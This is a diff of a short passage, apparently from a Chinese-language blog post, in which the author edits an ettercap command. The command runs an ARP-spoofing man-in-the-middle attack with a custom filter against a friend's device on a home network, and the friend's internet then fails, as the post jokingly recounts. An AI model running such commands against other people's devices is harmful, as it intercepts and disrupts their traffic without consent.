@@ -63,7 +63,7 @@ etterfilter banLGC.filter -o banLGC.ef
 接着，我们在路由器后台找到LGC的IP地址，然后用我们刚刚编译好的脚本，发起对LGC的中间人攻击
 
 ~~~
-ettercap -i eth0 -Tq -M arp:remote /192.168.31.106// /192.168.31.1// -F alert.ef
+ettercap -i eth0 -Tq -M arp:remote /192.168.31.106// /192.168.31.1// -F banLGC.ef
 ~~~
 
 猛然间，不远处的LGC发出了杠铃般的笑声————Gengxin！你要做什么！我网速是怎么了！！   
